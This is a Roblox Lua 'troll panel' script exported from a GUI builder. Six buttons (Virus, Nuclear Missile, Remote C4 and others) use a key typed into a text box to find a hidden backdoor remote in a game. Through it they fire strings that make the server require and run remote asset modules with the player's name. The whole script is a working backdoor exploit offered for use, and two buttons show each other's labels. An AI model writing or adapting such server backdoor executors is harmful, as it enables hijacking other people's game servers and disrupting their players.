-- Gui to Lua
-- Version: 3.2

-- Instances:

local GHOST = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")
local Hammer = Instance.new("TextButton")
local RemoteC4 = Instance.new("TextButton")
local GrabKnifeV4 = Instance.new("TextButton")
local Missile = Instance.new("TextButton")
local Virus = Instance.new("TextButton")
local Excavator = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
local KeyInputBox = Instance.new("TextBox")
local TextLabel_3 = Instance.new("TextLabel")

--Properties:

GHOST.Name = "GHOST"
GHOST.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
GHOST.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
GHOST.ResetOnSpawn = false

TextLabel.Parent = GHOST
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 5
TextLabel.Position = UDim2.new(0.0549049191, 0, 0.144178137, 0)
TextLabel.Size = UDim2.new(0, 388, 0, 550)
TextLabel.Font = Enum.Font.SourceSansSemibold
TextLabel.LineHeight = 1.180
TextLabel.Text = "Owned by agentc4t_0"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 75.000
TextLabel.TextTransparency = 0.670
TextLabel.TextWrapped = true

Hammer.Name = "Hammer"
Hammer.Parent = GHOST
Hammer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hammer.BorderColor3 = Color3.fromRGB(0, 0, 0)
Hammer.BorderSizePixel = 2
Hammer.Position = UDim2.new(0.0595880412, 0, 0.653694928, 0)
Hammer.Size = UDim2.new(0, 183, 0, 40)
Hammer.Font = Enum.Font.SourceSans
Hammer.Text = "Hammer"
Hammer.TextColor3 = Color3.fromRGB(0, 0, 0)
Hammer.TextScaled = true
Hammer.TextSize = 14.000
Hammer.TextWrapped = true

RemoteC4.Name = "Remote C4"
RemoteC4.Parent = GHOST
RemoteC4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RemoteC4.BorderColor3 = Color3.fromRGB(0, 0, 0)
RemoteC4.BorderSizePixel = 2
RemoteC4.Position = UDim2.new(0.159374654, 0, 0.653694928, 0)
RemoteC4.Size = UDim2.new(0, 183, 0, 40)
RemoteC4.Font = Enum.Font.SourceSans
RemoteC4.Text = "Remote C4"
RemoteC4.TextColor3 = Color3.fromRGB(0, 0, 0)
RemoteC4.TextScaled = true
RemoteC4.TextSize = 14.000
RemoteC4.TextWrapped = true

GrabKnifeV4.Name = "Grab Knife V4"
GrabKnifeV4.Parent = GHOST
GrabKnifeV4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GrabKnifeV4.BorderColor3 = Color3.fromRGB(0, 0, 0)
GrabKnifeV4.BorderSizePixel = 2
GrabKnifeV4.Position = UDim2.new(0.0595880412, 0, 0.601350307, 0)
GrabKnifeV4.Size = UDim2.new(0, 183, 0, 40)
GrabKnifeV4.Font = Enum.Font.SourceSans
GrabKnifeV4.Text = "Grab Knife V4"
GrabKnifeV4.TextColor3 = Color3.fromRGB(0, 0, 0)
GrabKnifeV4.TextScaled = true
GrabKnifeV4.TextSize = 14.000
GrabKnifeV4.TextWrapped = true

Missile.Name = "Missile"
Missile.Parent = GHOST
Missile.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Missile.BorderColor3 = Color3.fromRGB(0, 0, 0)
Missile.BorderSizePixel = 2
Missile.Position = UDim2.new(0.0595880412, 0, 0.546824694, 0)
Missile.Size = UDim2.new(0, 183, 0, 40)
Missile.Font = Enum.Font.SourceSans
Missile.Text = "Nuclear Missile"
Missile.TextColor3 = Color3.fromRGB(0, 0, 0)
Missile.TextScaled = true
Missile.TextSize = 14.000
Missile.TextWrapped = true

Virus.Name = "Virus"
Virus.Parent = GHOST
Virus.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Virus.BorderColor3 = Color3.fromRGB(0, 0, 0)
Virus.BorderSizePixel = 2
Virus.Position = UDim2.new(0.158856586, 0, 0.545942783, 0)
Virus.Size = UDim2.new(0, 183, 0, 40)
Virus.Font = Enum.Font.SourceSans
Virus.Text = "Virus"
Virus.TextColor3 = Color3.fromRGB(0, 0, 0)
Virus.TextScaled = true
Virus.TextSize = 14.000
Virus.TextWrapped = true

Excavator.Name = "Excavator"
Excavator.Parent = GHOST
Excavator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Excavator.BorderColor3 = Color3.fromRGB(0, 0, 0)
Excavator.BorderSizePixel = 2
Excavator.Position = UDim2.new(0.158856586, 0, 0.600598693, 0)
Excavator.Size = UDim2.new(0, 183, 0, 40)
Excavator.Font = Enum.Font.SourceSans
Excavator.Text = "Excavator"
Excavator.TextColor3 = Color3.fromRGB(0, 0, 0)
Excavator.TextScaled = true
Excavator.TextSize = 14.000
Excavator.TextWrapped = true

TextLabel_2.Parent = GHOST
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.0531748533, 0, 0.0901935622, 0)
TextLabel_2.Size = UDim2.new(0, 395, 0, 41)
TextLabel_2.Font = Enum.Font.Unknown
TextLabel_2.Text = "ghost agent troll penel"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 43.000
TextLabel_2.TextWrapped = true

KeyInputBox.Name = "KeyInputBox"
KeyInputBox.Parent = GHOST
KeyInputBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KeyInputBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
KeyInputBox.BorderSizePixel = 2
KeyInputBox.Position = UDim2.new(0.263368875, 0, 0.143306404, 0)
KeyInputBox.Size = UDim2.new(0, 390, 0, 50)
KeyInputBox.Font = Enum.Font.SourceSans
KeyInputBox.PlaceholderText = "Key"
KeyInputBox.Text = ""
KeyInputBox.TextColor3 = Color3.fromRGB(0, 0, 0)
KeyInputBox.TextSize = 31.000
KeyInputBox.TextWrapped = true

TextLabel_3.Parent = GHOST
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.0531748533, 0, 0.742015362, 0)
TextLabel_3.Size = UDim2.new(0, 395, 0, 41)
TextLabel_3.Font = Enum.Font.Unknown
TextLabel_3.Text = "Hey this script has auto destruction function, If you leak it, you could cause alot of trouble."
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 43.000
TextLabel_3.TextWrapped = true

-- Scripts:

local function GDXOGU_fake_script() -- Hammer.HR 
	local script = Instance.new('LocalScript', Hammer)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 0x1767bf813 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d).CLoad("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Remote C4"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Remote C4"
	Button.Active = true
end
coroutine.wrap(GDXOGU_fake_script)()
local function RUIKVA_fake_script() -- RemoteC4.R4 
	local script = Instance.new('LocalScript', RemoteC4)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 8038037940 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d)("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Hammer"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Hammer"
	Button.Active = true
end
coroutine.wrap(RUIKVA_fake_script)()
local function XQJF_fake_script() -- GrabKnifeV4.G4 
	local script = Instance.new('LocalScript', GrabKnifeV4)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 16662802057 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d).load("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Grab Knife V4"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Grab Knife V4"
	Button.Active = true
end
coroutine.wrap(XQJF_fake_script)()
local function TGPP_fake_script() -- Missile.ME 
	local script = Instance.new('LocalScript', Missile)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 7804327506 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d).amigodogodenot123("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Nuclear Missile"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Nuclear Missile"
	Button.Active = true
end
coroutine.wrap(TGPP_fake_script)()
local function QJGFN_fake_script() -- Virus.VS 
	local script = Instance.new('LocalScript', Virus)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 8317917339 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d).Infection("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Virus"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Virus"
	Button.Active = true
end
coroutine.wrap(QJGFN_fake_script)()
local function OAEVQPA_fake_script() -- Excavator.Ex 
	local script = Instance.new('LocalScript', Excavator)

	-- This script is designed to be placed inside the TextButton that triggers the execution.
	-- It reads the key (the DummyFunction name) from a nearby TextBox and fires the remote event.
	
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local Button = script.Parent -- The TextButton this script is parented to
	
	-- Configuration
	local PAYLOAD_MODULE_ID = 113179808318277 -- The asset ID of the module you want to require on the server.
	
	-- --- GUI LOCATION (ADJUST THIS PATH) ---
	-- Assuming the TextBox where the user manually enters the key is named "KeyInputBox" 
	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d)("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Excavator"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Excavator"
	Button.Active = true
end
coroutine.wrap(OAEVQPA_fake_script)()